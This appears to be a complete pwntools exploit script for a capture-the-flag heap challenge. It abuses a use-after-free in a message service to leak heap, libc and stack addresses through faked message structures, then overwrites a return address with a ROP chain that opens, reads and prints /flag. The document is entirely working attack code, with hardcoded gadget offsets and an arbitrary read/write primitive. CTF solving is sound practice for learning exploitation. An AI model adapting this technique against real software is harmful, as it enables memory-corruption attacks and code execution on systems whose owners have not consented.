from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

MENU = b'7) list         0) quit\n> '

MAIN_ARENA_PTR = 0x21ace0
ENVIRON = 0x222200
RET_MARKER = 0x29d90
POP_RDI, POP_RSI, POP_RDX_RBX, POP_RAX = 0x2a3e5, 0x2be51, 0x90469, 0x45eb0
XCHG_EAX_EDI, SYSCALL = 0x164f5e, 0x912d6

io = remote('chal.thjcc.org', 9004)

def compose(slot, length, subject, body):
    io.sendlineafter(MENU, b'1')
    io.sendlineafter(b'slot> ', str(slot).encode())
    io.sendlineafter(b'length> ', str(length).encode())
    io.sendlineafter(b'subject> ', subject)
    io.sendafter(b'body> ', body)

def discard(slot):
    io.sendlineafter(MENU, b'2')
    io.sendlineafter(b'slot> ', str(slot).encode())

def subscribe(slot, channel):
    io.sendlineafter(MENU, b'3')
    io.sendlineafter(b'slot> ', str(slot).encode())
    io.sendlineafter(b'channel> ', str(channel).encode())

def replay(channel, length):
    io.sendlineafter(MENU, b'5')
    io.sendlineafter(b'channel> ', str(channel).encode())
    return io.recvn(length)

def amend(channel, body):
    io.sendlineafter(MENU, b'6')
    io.sendlineafter(b'channel> ', str(channel).encode())
    io.sendafter(b'body> ', body)

def fake_msg(addr, length):
    return b'X' * 0x20 + p64(addr) + p64(length) + b'\x01' + b'\0' * 7

def solve_heap(encoded):
    x = encoded
    for _ in range(10):
        x = encoded ^ ((x >> 12) + 1)
    return x - 0x1ac0


def read_once(addr, length):
    compose(1, 0x38, b'R', fake_msg(addr, length))
    data = replay(0, length)
    discard(1)
    compose(1, 0x38, b'F', b'F' * 0x38)
    discard(1)
    return data


compose(0, 0x38, b'A', b'A' * 0x38)
for ch in range(256):
    subscribe(0, ch)
discard(0)

heap = solve_heap(u64(replay(0, 8)))
log.success(f'heap  = {heap:#x}')
libc = u64(read_once(heap + 0x1370, 8)) - MAIN_ARENA_PTR
log.success(f'libc  = {libc:#x}')
environ = u64(read_once(libc + ENVIRON, 8))
log.success(f'stack = {environ:#x}')

window = read_once(environ - 0x400, 0x800)
retaddr = environ - 0x400 + window.index(p64(libc + RET_MARKER))
log.success(f'ret   = {retaddr:#x}')

path, buf = retaddr + 0x900, retaddr + 0xd00
chain = [
    libc + POP_RAX, 257, libc + POP_RDI, -100, libc + POP_RSI, path,
    libc + POP_RDX_RBX, 0, 0, libc + SYSCALL,
    libc + XCHG_EAX_EDI, libc + POP_RAX, 0, libc + POP_RSI, buf,
    libc + POP_RDX_RBX, 0x80, 0, libc + SYSCALL,
    libc + POP_RAX, 1, libc + POP_RDI, 1, libc + POP_RSI, buf,
    libc + POP_RDX_RBX, 0x80, 0, libc + SYSCALL,
    libc + POP_RAX, 60, libc + POP_RDI, 0, libc + SYSCALL,
]

compose(1, 0x38, b'W', fake_msg(retaddr, 0xd80))
amend(0, flat(chain).ljust(0x900, b'\x00') + b'/flag'.ljust(0x480, b'\x00'))

io.sendlineafter(MENU, b'0')
io.stream()
